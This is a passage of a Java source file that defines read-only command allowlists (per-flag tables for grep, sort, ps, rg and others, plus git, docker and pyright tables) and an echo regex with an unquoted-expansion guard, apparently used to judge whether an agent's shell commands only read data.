     * <p>pyright 静态类型检查器：{@code respectsDoubleDash=false}（CC 注释：pyright 把 {@code --}
     * 当文件路径，不是 end-of-options）；{@code --watch/-w} 经 CC
     * {@code additionalCommandIsDangerousCallback} 判危险，Java 端由调用方对 args 扫 {@code --watch/-w} 复刻。
     */
    static final Map<String, ExternalCommandConfig> PYRIGHT_READ_ONLY_COMMANDS = Map.ofEntries(
        Map.entry("pyright", new ExternalCommandConfig(flags("--outputjson", FlagArgType.NONE,
            "--project", FlagArgType.STRING, "-p", FlagArgType.STRING, "--pythonversion", FlagArgType.STRING,
            "--pythonplatform", FlagArgType.STRING, "--typeshedpath", FlagArgType.STRING, "--venvpath", FlagArgType.STRING,
            "--level", FlagArgType.STRING, "--stats", FlagArgType.NONE, "--verbose", FlagArgType.NONE,
            "--version", FlagArgType.NONE, "--dependencies", FlagArgType.NONE, "--warnings", FlagArgType.NONE),
            false, null))
    );
    static final java.util.List<String> EXTERNAL_READONLY_COMMANDS = java.util.List.of(
        "docker ps", "docker images"
    );

    // ════════════════════════════════════════════════════════════════════════
    // bash COMMAND_ALLOWLIST · 对齐 CC BashTool/readOnlyValidation.ts:128-1140
    // ════════════════════════════════════════════════════════════════════════
    private static final Map<String, CmdletConfig> BASH_COMMAND_ALLOWLIST = Map.ofEntries(
        Map.entry("xargs", CmdletConfig.safe("-I", "-n", "-P", "-L", "-s", "-E", "-0", "-t", "-r", "-x", "-d")),
        Map.entry("file", CmdletConfig.safe("--brief", "-b", "--mime", "-i", "--mime-type", "--mime-encoding",
            "--apple", "--check-encoding", "-c", "--exclude", "--exclude-quiet", "--print0", "-0", "-f", "-F",
            "--separator", "--help", "--version", "-v", "--no-dereference", "-h", "--dereference", "-L",
            "--magic-file", "-m", "--keep-going", "-k", "--list", "-l", "--no-buffer", "-n", "--preserve-date",
            "-p", "--raw", "-r", "-s", "--special-files", "--uncompress", "-z")),
        Map.entry("sed", CmdletConfig.safe("--expression", "-e", "--quiet", "--silent", "-n", "--regexp-extended",
            "-r", "--posix", "-E", "--line-length", "-l", "--zero-terminated", "-z", "--separate", "-s",
            "--unbuffered", "-u", "--debug", "--help", "--version")),
        Map.entry("sort", CmdletConfig.safe("--ignore-leading-blanks", "-b", "--dictionary-order", "-d",
            "--ignore-case", "-f", "--general-numeric-sort", "-g", "--human-numeric-sort", "-h",
            "--ignore-nonprinting", "-i", "--month-sort", "-M", "--numeric-sort", "-n", "--random-sort", "-R",
            "--reverse", "-r", "--sort", "--stable", "-s", "--unique", "-u", "--version-sort", "-V",
            "--zero-terminated", "-z", "--key", "-k", "--field-separator", "-t", "--check", "-c",
            "--check-char-order", "-C", "--merge", "-m", "--buffer-size", "-S", "--parallel", "--batch-size",
            "--help", "--version")),
        Map.entry("man", CmdletConfig.safe("-a", "--all", "-d", "-f", "--whatis", "-h", "-k", "--apropos", "-l",
            "-w", "-S", "-s")),
        Map.entry("help", CmdletConfig.safe("-d", "-m", "-s")),
        Map.entry("netstat", CmdletConfig.safe("-a", "-L", "-l", "-n", "-f", "-g", "-i", "-I", "-s", "-r", "-m", "-v")),
        Map.entry("ps", CmdletConfig.safe("-e", "-A", "-a", "-d", "-N", "--deselect", "-f", "-F", "-l", "-j", "-y",
            "-w", "-ww", "--width", "-c", "-H", "--forest", "--headers", "--no-headers", "-n", "--sort", "-L", "-T",
            "-m", "-C", "-G", "-g", "-p", "--pid", "-q", "--quick-pid", "-s", "--sid", "-t", "--tty", "-U", "-u",
            "--user", "--help", "--info", "-V", "--version")),
        Map.entry("base64", CmdletConfig.safe("-d", "-D", "--decode", "-b", "--break", "-w", "--wrap", "-i",
            "--input", "--ignore-garbage", "-h", "--help", "--version")),
        Map.entry("grep", CmdletConfig.safe("-e", "--regexp", "-f", "--file", "-F", "--fixed-strings", "-G",
            "--basic-regexp", "-E", "--extended-regexp", "-P", "--perl-regexp", "-i", "--ignore-case",
            "--no-ignore-case", "-v", "--invert-match", "-w", "--word-regexp", "-x", "--line-regexp", "-c",
            "--count", "--color", "--colour", "-L", "--files-without-match", "-l", "--files-with-matches", "-m",
            "--max-count", "-o", "--only-matching", "-q", "--quiet", "--silent", "-s", "--no-messages", "-b",
            "--byte-offset", "-H", "--with-filename", "-h", "--no-filename", "--label", "-n", "--line-number",
            "-T", "--initial-tab", "-u", "--unix-byte-offsets", "-Z", "--null", "-z", "--null-data", "-A",
            "--after-context", "-B", "--before-context", "-C", "--context", "--group-separator",
            "--no-group-separator", "-a", "--text", "--binary-files", "-D", "--devices", "-d", "--directories",
            "--exclude", "--exclude-from", "--exclude-dir", "--include", "-r", "--recursive", "-R",
            "--dereference-recursive", "--line-buffered", "-U", "--binary", "--help", "-V", "--version")),
        Map.entry("rg", CmdletConfig.safe("-e", "--regexp", "-f", "-i", "--ignore-case", "-S", "--smart-case", "-F",
            "--fixed-strings", "-w", "--word-regexp", "-v", "--invert-match", "-c", "--count", "-l",
            "--files-with-matches", "--files-without-match", "-n", "--line-number", "-o", "--only-matching", "-A",
            "--after-context", "-B", "--before-context", "-C", "--context", "-H", "-h", "--heading",
            "--no-heading", "-q", "--quiet", "--column", "-g", "--glob", "-t", "--type", "-T", "--type-not",
            "--type-list", "--hidden", "--no-ignore", "-u", "-m", "--max-count", "-d", "--max-depth", "-a",
            "--text", "-z", "-L", "--follow", "--color", "--json", "--stats", "--help", "--version", "--")),
        Map.entry("sha256sum", CmdletConfig.safe("-b", "--binary", "-t", "--text", "-c", "--check",
            "--ignore-missing", "--quiet", "--status", "--strict", "-w", "--warn", "--tag", "-z", "--zero",
            "--help", "--version")),
        Map.entry("sha1sum", CmdletConfig.safe("-b", "--binary", "-t", "--text", "-c", "--check",
            "--ignore-missing", "--quiet", "--status", "--strict", "-w", "--warn", "--tag", "-z", "--zero",
            "--help", "--version")),
        Map.entry("md5sum", CmdletConfig.safe("-b", "--binary", "-t", "--text", "-c", "--check",
            "--ignore-missing", "--quiet", "--status", "--strict", "-w", "--warn", "--tag", "-z", "--zero",
            "--help", "--version")),
        Map.entry("tree", CmdletConfig.safe("-a", "-d", "-l", "-f", "-x", "-L", "-P", "-I", "--gitignore",
            "--gitfile", "--ignore-case", "--matchdirs", "--metafirst", "--prune", "--info", "--infofile",
            "--noreport", "--charset", "--filelimit", "-q", "-N", "-Q", "-p", "-u", "-g", "-s", "-h", "--si",
            "--du", "-D", "--timefmt", "-F", "--inodes", "--device", "-v", "-t", "-c", "-U", "-r", "--dirsfirst",
            "--filesfirst", "--sort", "-i", "-A", "-S", "-n", "-C", "-X", "-J", "-H", "--nolinks", "--hintro",
            "--houtro", "-T", "--hyperlink", "--scheme", "--authority", "--fromfile", "--fromtabfile", "--fflinks",
            "--help", "--version")),
        Map.entry("date", CmdletConfig.safe("-d", "--date", "-r", "--reference", "-u", "--utc", "--universal",
            "-I", "--iso-8601", "-R", "--rfc-email", "--rfc-3339", "--debug", "--help", "--version")),
        Map.entry("hostname", CmdletConfig.safeWithCallback(ReadOnlyCommandTable::hostnamePositionalDangerous,
            "-f", "--fqdn", "--long", "-s", "--short", "-i",
            "--ip-address", "-I", "--all-ip-addresses", "-a", "--alias", "-d",
            "--domain", "-A", "--all-fqdns", "-v", "--verbose", "-h", "--help", "-V", "--version")),
        Map.entry("info", CmdletConfig.safe("-f", "--file", "-d", "--directory", "-n", "--node", "-a", "--all",
            "-k", "--apropos", "-w", "--where", "--location", "--show-options", "--vi-keys", "--subnodes", "-h",
            "--help", "--usage", "--version")),
        Map.entry("lsof", CmdletConfig.safe("-?", "-h", "-v", "-a", "-b", "-C", "-l", "-n", "-N", "-O", "-P", "-Q",
            "-R", "-t", "-U", "-V", "-X", "-H", "-E", "-F", "-g", "-i", "-K", "-L", "-o", "-r", "-s", "-S", "-T",
            "-x", "-A", "-c", "-d", "-e", "-k", "-p", "-u")),
        Map.entry("pgrep", CmdletConfig.safe("-d", "--delimiter", "-l", "--list-name", "-a", "--list-full", "-v",
            "--inverse", "-w", "--lightweight", "-c", "--count", "-f", "--full", "-g", "--pgroup", "-G", "--group",
            "-i", "--ignore-case", "-n", "--newest", "-o", "--oldest", "-O", "--older", "-P", "--parent", "-s",
            "--session", "-t", "--terminal", "-u", "--euid", "-U", "--uid", "-x", "--exact", "-F", "--pidfile",
            "-L", "--logpidfile", "-r", "--runstates", "--ns", "--nslist", "--help", "-V", "--version")),
        Map.entry("tput", CmdletConfig.safe("-T", "-V", "-x")),
        Map.entry("ss", CmdletConfig.safe("-h", "--help", "-V", "--version", "-n", "--numeric", "-r", "--resolve",
            "-a", "--all", "-l", "--listening", "-o", "--options", "-e", "--extended", "-m", "--memory", "-p",
            "--processes", "-i", "--info", "-s", "--summary", "-4", "--ipv4", "-6", "--ipv6", "-0", "--packet",
            "-t", "--tcp", "-M", "--mptcp", "-S", "--sctp", "-u", "--udp", "-d", "--dccp", "-w", "--raw", "-x",
            "--unix", "--tipc", "--vsock", "-f", "--family", "-A", "--query", "--socket", "-Z", "--context", "-z",
            "--contexts", "-b", "--bpf", "-E", "--events", "-H", "--no-header", "-O", "--oneline", "--tipcinfo",
            "--tos", "--cgroup", "--inet-sockopt")),
        Map.entry("fd", CmdletConfig.safe()),
        Map.entry("fdfind", CmdletConfig.safe())
    );

    /**
     * bash 命令名层只读 allowlist — 对齐 CC BashTool/readOnlyValidation.ts READONLY_COMMANDS
     * (:1432-1503) + READONLY_COMMAND_REGEXES 简单命令 (:1509+，名字层) + COMMAND_ALLOWLIST
     * 核心命令名（isCommandSafeViaFlagParsing flag 级表之外的名字层等价）。
     *
     * <p><b>CC 两层权威结构</b>：{@code isCommandReadOnly}（readOnlyValidation.ts:1678）先走
     * {@code COMMAND_ALLOWLIST}（flag 级 51 键，isCommandSafeViaFlagParsing:1246）后走
     * {@code READONLY_COMMAND_REGEXES}（:1509-1511，由 {@code READONLY_COMMANDS} 名字层
     * {@code makeRegexForSafeCommand} 生成）——两层都存活。本表即 Java 侧的名字层等价
     * （P1 命令名级；CC 40+ 命令 flag 级校验属 P2），搬迁自原 BashParser.READONLY_COMMANDS
     * 私有 Set（A7b 删旧表后单源化）。
     *
     * <p>CC 原名 + 行号：READONLY_COMMANDS (readOnlyValidation.ts:1432-1503)、
     * READONLY_COMMAND_REGEXES 简单命令名字层 (:1509+)、COMMAND_ALLOWLIST 核心命令名
     * （readOnlyValidation.ts:128-1140，flag 级表内亦含 grep/find/ls 等）。
     */
    private static final Set<String> BASH_READONLY_COMMAND_NAMES = Set.of(
        // CC READONLY_COMMANDS (readOnlyValidation.ts:1432-1503)
        "cat", "head", "tail", "wc", "stat", "strings", "hexdump", "od", "nl",
        "id", "uname", "free", "df", "du", "locale", "groups", "nproc",
        "basename", "dirname", "realpath", "readlink",
        "cut", "paste", "tr", "column", "tac", "rev", "fold", "expand", "unexpand",
        "fmt", "comm", "cmp", "numfmt", "diff",
        "true", "false", "sleep", "which", "type", "expr", "test", "getconf",
        "seq", "tsort", "pr", "cal", "uptime",
        // CC READONLY_COMMAND_REGEXES 简单命令名字层 (readOnlyValidation.ts:1509+)
        "echo", "pwd", "whoami", "uniq", "history", "alias", "arch",
        // COMMAND_ALLOWLIST 核心命令名 (isCommandSafeViaFlagParsing, P2 flag 校验)
        "ls", "grep", "find", "rg", "tree"
    );

    /**
     * echo 简单形式只读正则 — 对齐 CC READONLY_COMMAND_REGEXES echo 条目
     * (readOnlyValidation.ts:1516)：{@code /^echo(?:\s+(?:'[^']*'|"[^"$<>\n\r]*"|[^|;&`$(){}><#\\!"'\s]+))*(?:\s+2>&1)?\s*$/}。
     *
     * <p>语义（CC 源真理，非注释）：仅放行"不执行命令/不使用变量/不写文件"的 echo 简单形式——
     * 单引号串（允许换行）、双引号串（禁 {@code $<>}，防变量展开）、未引号 token（禁
     * {@code |;&`$(){}><#\"'\\} 与空白）。注意正则内的 {@code (?:\s+2>&1)?} 因 {@code $} 为
     * 结束锚点而永不匹配尾随 {@code 2>&1}——CC isCommandReadOnly:1682-1686 实为预先剥离
     * {@code 2>&1} 后缀再匹配，见 {@link #matchesBashReadonlyEcho}。
     *
     * <p>GC 原名 + 行号：{@code READONLY_COMMAND_REGEXES} echo (Open-ClaudeCode/src/tools/BashTool/
     * readOnlyValidation.ts:1516)。
     */
    private static final Pattern BASH_READONLY_ECHO_PATTERN = Pattern.compile(
        "^echo(?:\\s+(?:'[^']*'|\"[^\"$<>\\n\\r]*\"|[^|;&`$(){}><#\\\\!\"'\\s]+))*(?:\\s+2>&1)?\\s*$");

    // ════════════════════════════════════════════════════════════════════════
    // 查询 API
    // ════════════════════════════════════════════════════════════════════════

    /** 解析 PS 命令名 → 规范 cmdlet 名（CC readOnlyValidation.ts:984-996 resolveToCanonical）。 */
    public static String resolveToCanonical(String name) {
        if (name == null) {
            return "";
        }
        String lower = name.toLowerCase();
        if (!lower.contains("\\") && !lower.contains("/")) {
            lower = lower.replaceAll("\\.(exe|cmd|bat|com)$", "");
        }
        String alias = COMMON_ALIASES.get(lower);
        if (alias != null) {
            return alias.toLowerCase();
        }
        return lower;
    }

    /** 查 PS cmdlet allowlist（CC readOnlyValidation.ts:1088-1101 lookupAllowlist）。 */
    public static CmdletConfig lookupPsCmdlet(String name) {
        String lower = name.toLowerCase();
        CmdletConfig direct = PS_CMDLET_ALLOWLIST.get(lower);
        if (direct != null) {
            return direct;
        }
        String canonical = resolveToCanonical(lower);
        if (!canonical.equals(lower)) {
            return PS_CMDLET_ALLOWLIST.get(canonical);
        }
        return null;
    }

    /** 查 bash COMMAND_ALLOWLIST（供 Bash 侧后续复用登记）。 */
    public static CmdletConfig lookupBashCommand(String name) {
        return name == null ? null : BASH_COMMAND_ALLOWLIST.get(name.toLowerCase());
    }

    /**
     * 查 bash 命令名层只读 allowlist — 对齐 CC READONLY_COMMAND_REGEXES 名字层等价
     * (readOnlyValidation.ts:1432-1503 + :1509+)。null/大小写安全（小写归一）。
     *
     * <p>isReadOnly 契约的 fail-closed gate：命令名不在名字层 → 非只读（CC isCommandReadOnly
     * regex tier 未命中 → return false）。原 BashParser.READONLY_COMMANDS 私有 Set 搬迁至此
     * （A7b，单源化）。
     */
    public static boolean lookupBashCommandName(String name) {
        return name != null && BASH_READONLY_COMMAND_NAMES.contains(name.toLowerCase());
    }

    /**
     * echo 简单形式是否只读 — 对齐 CC {@code isCommandReadOnly} 的 regex tier
     * (readOnlyValidation.ts:1719) 对 echo 条目的等价判定。首词须为小写 {@code echo}
     * （CC {@code ^echo} 大小写敏感，{@code ECHO hi} 不放行）且全命令命中
     * {@link #BASH_READONLY_ECHO_PATTERN}。
     *
     * <p>镜像 CC isCommandReadOnly (:1678-1720) 的两个前置步骤，防裸名字层放行写命令
     * （如 {@code cat a>b} / {@code echo a|b}）：
     * <ol>
     *   <li><b>尾随 {@code 2>&1} 预剥离</b>（:1682-1686）：stderr 合并重定向只读，先
     *       {@code trim()} 再剥 {@code 2>&1} 后缀，然后才匹配正则。</li>
     *   <li><b>未引号展开守卫</b>（{@code containsUnquotedExpansion} :1600-1630）：bash 运行时
     *       展开 glob（{@code *?[]}）与 {@code $} 变量，可能把文件名单词展开成危险 flag，
     *       无法在静态期验证 → 拒绝（如 {@code echo *}）。</li>
     * </ol>
     *
     * <p>GC 原名 + 行号：{@code isCommandReadOnly} (Open-ClaudeCode/src/tools/BashTool/
     * readOnlyValidation.ts:1678)、{@code containsUnquotedExpansion} (:1600)、echo 正则 (:1516)。
     *
     * @param command 待判定的整条 bash 命令字符串
     * @return 仅当 echo 简单形式（无管道/无重定向/无变量/无未引号 glob/无命令替换）时 true
     */
    public static boolean matchesBashReadonlyEcho(String command) {
        if (command == null) {
            return false;
        }
        String testCommand = command.trim();
        // 镜像 CC isCommandReadOnly:1682-1686 — 预剥离尾随 " 2>&1"（stderr 重定向，只读）
        if (testCommand.endsWith(" 2>&1")) {
            testCommand = testCommand.substring(0, testCommand.length() - 5).trim();
        }
        if (!BASH_READONLY_ECHO_PATTERN.matcher(testCommand).matches()) {
            return false;
        }
        // 镜像 CC isCommandReadOnly:1706-1708 — containsUnquotedExpansion 前置守卫（glob/$ 展开）
        return !containsUnquotedExpansion(testCommand);
    }

    /**
     * 未引号展开守卫 — 对齐 CC {@code containsUnquotedExpansion} (readOnlyValidation.ts:1600-1630)。
     *
     * <p>带引号状态机扫描：单引号内一切字面（跳过）；双引号内 {@code $} 仍展开（拒绝）但 glob
     * 字面（跳过）；未引号的 {@code $}（后随变量名/特殊参数符）与 glob 字符 {@code *?[]} → true。
     * 对 echo 而言 {@code $} 分支与 {@link #BASH_READONLY_ECHO_PATTERN} 已互斥（正则排除未引号/
     * 双引号 {@code $}），本守卫主要拦截正则未排除的未引号 glob。
     *
     * <p>GC 原名 + 行号：{@code containsUnquotedExpansion} (Open-ClaudeCode/src/tools/BashTool/
     * readOnlyValidation.ts:1600)。
     */
    private static boolean containsUnquotedExpansion(String command) {
        boolean inSingleQuote = false;
        boolean inDoubleQuote = false;
        boolean escaped = false;
        for (int i = 0; i < command.length(); i++) {
            char c = command.charAt(i);
            if (escaped) {
                escaped = false;
                continue;
            }
            // CC :1608-1616 — 单引号外反斜杠为转义；单引号内 '\' 为字面（bash 语义），防引号状态失步
            if (c == '\\' && !inSingleQuote) {
                escaped = true;
                continue;
            }
            if (c == '\'' && !inDoubleQuote) {
                inSingleQuote = !inSingleQuote;
                continue;
            }
            if (c == '"' && !inSingleQuote) {
                inDoubleQuote = !inDoubleQuote;
                continue;
            }
            // 单引号内全字面
            if (inSingleQuote) {
                continue;
            }
            // CC :1627-1631 — $ 在双引号内与未引号均展开（仅单引号字面）
            if (c == '$' && i + 1 < command.length()
                && "[A-Za-z_@*#?!$0-9-]".indexOf(command.charAt(i + 1)) >= 0) {
                return true;
            }
            // glob 在双引号内字面，仅查未引号
            if (inDoubleQuote) {
                continue;
            }
            // CC :1635-1638 — 未引号 glob 字符可展开为任意内容（含危险 flag）→ 拒绝
            if (c == '*' || c == '?' || c == '[' || c == ']') {
                return true;
            }
        }
        return false;
    }

    /** bash 命令名层只读 allowlist 条目数（可测性，镜像 bashCommandCount）。 */
    public static int bashReadonlyCommandNameCount() {
        return BASH_READONLY_COMMAND_NAMES.size();
    }

    /** 查外部命令表（git/gh/docker/pyright 走外部命令校验）。 */
    public static ExternalCommandConfig lookupExternalCommand(String key) {
        ExternalCommandConfig g = GIT_READ_ONLY_COMMANDS.get(key);
        if (g != null) {
            return g;
        }
        g = GH_READ_ONLY_COMMANDS.get(key);
        if (g != null) {
            return g;
        }
        g = DOCKER_READ_ONLY_COMMANDS.get(key);
        if (g != null) {
            return g;
        }
        return PYRIGHT_READ_ONLY_COMMANDS.get(key);
    }

    /** 是否外部只读命令（EXTERNAL_READONLY_COMMANDS，无 flag 约束）。 */
    public static boolean isExternalReadOnlyCommand(String key) {
        return EXTERNAL_READONLY_COMMANDS.contains(key);
    }

    public static int psCmdletCount() {
        return PS_CMDLET_ALLOWLIST.size();
    }

    public static int gitCommandCount() {
        return GIT_READ_ONLY_COMMANDS.size();
    }

    public static int ghCommandCount() {
        return GH_READ_ONLY_COMMANDS.size();
    }

    public static int dockerCommandCount() {
        return DOCKER_READ_ONLY_COMMANDS.size();
    }

    /**
     * bash COMMAND_ALLOWLIST 有效键数 · 对齐 CC 合并语义（BashTool/readOnlyValidation.ts:128-1140）。
     *
     * <p>CC COMMAND_ALLOWLIST = 23 显式键 + GIT_READ_ONLY_COMMANDS(24) + RIPGREP(rg) +
     * PYRIGHT(pyright) + DOCKER(2) = 51。Java 端 BASH_COMMAND_ALLOWLIST(24=23+rg) 为独立表，
     * git/pyright/docker 独立成表，计数须合并才能与 CC 一致。
     */
    public static int bashCommandCount() {
        return BASH_COMMAND_ALLOWLIST.size()
            + GIT_READ_ONLY_COMMANDS.size()
            + PYRIGHT_READ_ONLY_COMMANDS.size()
            + DOCKER_READ_ONLY_COMMANDS.size();
    }

    public static Set<String> psCmdletKeys() {
        return PS_CMDLET_ALLOWLIST.keySet();
    }

    public static Set<String> gitCommandKeys() {
        return GIT_READ_ONLY_COMMANDS.keySet();
    }

    public static Set<String> ghCommandKeys() {
        return GH_READ_ONLY_COMMANDS.keySet();
    }
}
